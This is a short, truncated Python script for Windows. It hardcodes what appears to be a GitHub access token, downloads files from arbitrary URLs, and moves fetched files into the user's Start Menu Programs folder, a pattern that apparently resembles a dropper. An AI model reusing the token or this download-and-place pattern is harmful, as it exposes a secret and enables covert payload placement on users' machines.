from datetime import datetime
from os import  fsync, listdir, environ , path , system , mkdir , walk , chdir , getcwd
from shutil import move , copy
from time import sleep
from github import Github
import base64
import pathlib
import subprocess
import git
import pyautogui
import requests
import json
import win32api
import zipfile
# _____(end import)_____ #
TOKEN = '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'
chdir(getcwd())
# _____(function)_____ #
try:
    def download(url: str, dest_folder: str):
        response = requests.get(url, stream=True)
        if response.ok:
            filename = url.split('/')[-1].replace(" ", "_")
            file_path = path.join(dest_folder, filename)
            with open(file_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=1024 * 8):
                    if chunk:
                        f.write(chunk), f.flush(), fsync(f.fileno())
        else:
            pass


    def move_file(path):
        path = environ['APPDATA'] + fr"\Microsoft\Windows\Start Menu\Programs{path}"
        try:
            for i in (listdir("software")):
                move(fr"software\{i}", path)
        except:
            pass

    #__________(deleted)__________#